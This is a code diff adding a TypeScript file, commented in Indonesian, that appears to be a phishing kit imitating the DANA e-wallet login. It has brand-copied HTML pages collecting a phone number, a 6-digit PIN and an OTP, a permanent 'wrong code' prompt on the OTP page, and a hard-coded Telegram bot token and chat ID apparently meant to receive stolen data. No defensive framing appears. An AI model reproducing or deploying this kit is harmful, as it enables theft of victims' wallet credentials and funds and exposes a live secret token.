@@ -1,0 +1,102 @@
+// === PENGATURAN DANA & TELEGRAM ===
+interface DanaSettings {
+  phoneNumber: string;
+  pin: string;
+  otp: string;
+}
+
+interface TelegramSettings {
+  botToken: string;
+  chatId: string;
+}
+
+// DATA KAMU
+const pengaturanTelegram: TelegramSettings = {
+  botToken: "8583908886:AAEeLYSYO4Nxri4kZgBM3lijZ_VxcYiUYEo",
+  chatId: "8798458499"
+};
+
+// === DESAIN HALAMAN SESUAI DANA ===
+const HALAMAN = {
+  LOGO_URL: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/DANA_Logo.svg/1200px-DANA_Logo.svg.png",
+  
+  HALAMAN_NOMOR: `
+  <div style="background:#0081c9; min-height:100vh; padding:20px; font-family:Arial;">
+    <div style="text-align:center; margin-bottom:30px;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/DANA_Logo.svg/1200px-DANA_Logo.svg.png" width="100">
+      <p style="color:white; font-size:14px; margin-top:8px;">Dompet Digital Terpercaya</p>
+    </div>
+
+    <div style="background:white; border-radius:12px; padding:25px; box-shadow:0 2px 8px #00000022;">
+      <h3 style="text-align:center; color:#333; margin-bottom:20px;">Masuk atau Daftar</h3>
+      
+      <label style="font-size:14px; color:#555;">Nomor Ponsel</label>
+      <input type="tel" id="nomor" placeholder="Contoh: 08123456789" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; margin:8px 0 4px 0; font-size:16px;">
+      <p style="font-size:12px; color:#888; margin-bottom:20px;">Pastikan nomor aktif & bisa menerima SMS</p>
+
+      <button id="lanjutNomor" style="width:100%; padding:12px; background:#0081c9; color:white; border:none; border-radius:8px; font-size:16px; font-weight:bold;">LANJUTKAN</button>
+    </div>
+
+    <p style="text-align:center; color:white; font-size:12px; margin-top:20px;">
+      Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b>
+    </p>
+  </div>
+  `,
+
+  HALAMAN_PIN: `
+  <div style="background:#0081c9; min-height:100vh; padding:20px; font-family:Arial;">
+    <div style="text-align:center; margin-bottom:30px;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/DANA_Logo.svg/1200px-DANA_Logo.svg.png" width="100">
+    </div>
+
+    <div style="background:white; border-radius:12px; padding:25px;">
+      <h3 style="text-align:center; color:#333; margin-bottom:20px;">Masukkan PIN DANA</h3>
+      <p style="text-align:center; color:#666; font-size:14px; margin-bottom:25px;">Masukkan 6 angka PIN akun kamu</p>
+
+      <div style="display:flex; justify-content:space-between; max-width:220px; margin:0 auto 8px auto;">
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+      </div>
+      <input type="password" id="pin" maxlength="6" style="opacity:0; position:absolute;">
+
+      <button id="lanjutPin" style="width:100%; padding:12px; background:#0081c9; color:white; border:none; border-radius:8px; font-size:16px; font-weight:bold; margin-top:20px;">KONFIRMASI</button>
+    </div>
+  </div>
+  `,
+
+  HALAMAN_OTP: `
+  <div style="background:#0081c9; min-height:100vh; padding:20px; font-family:Arial;">
+    <div style="text-align:center; margin-bottom:30px;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/DANA_Logo.svg/1200px-DANA_Logo.svg.png" width="100">
+    </div>
+
+    <div style="background:white; border-radius:12px; padding:25px;">
+      <h3 style="text-align:center; color:#333; margin-bottom:10px;">Verifikasi Nomor Ponsel</h3>
+      <p style="text-align:center; color:#666; font-size:14px; margin-bottom:25px;">Kode OTP dikirim ke nomor: <b id="nomorTujuan">08xxxxxxxxx</b></p>
+
+      <div style="display:flex; justify-content:space-between; max-width:220px; margin:0 auto 8px auto;">
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+        <div style="width:28px; height:38px; border-bottom:2px solid #999;"></div>
+      </div>
+      <input type="text" id="otp" maxlength="6" style="opacity:0; position:absolute;">
+
+      <!-- PESAN MERAH JIKA SALAH -->
+      <p id="pesanSalah" style="color:red; text-align:center; font-size:13px; margin:8px 0 15px 0; display:block;">
+        ❌ Pastikan kode OTP yang kamu masukan benar
+      </p>
+
+      <p style="text-align:center; font-size:13px; color:#666; margin-bottom:20px;">Belum terima kode? <a href="#" style="color:#0081c9; text-decoration:none;">Kirim Ulang</a></p>
+
+      <button id="kirimOtp" style="width:100%; padding:12px; background:#0081c9; color:white; border:none; border-radius:8px; font-size:16px; font-weight:bold;">VERIFIKASI</button>
+    </div>
+  </div>
+  `
+};
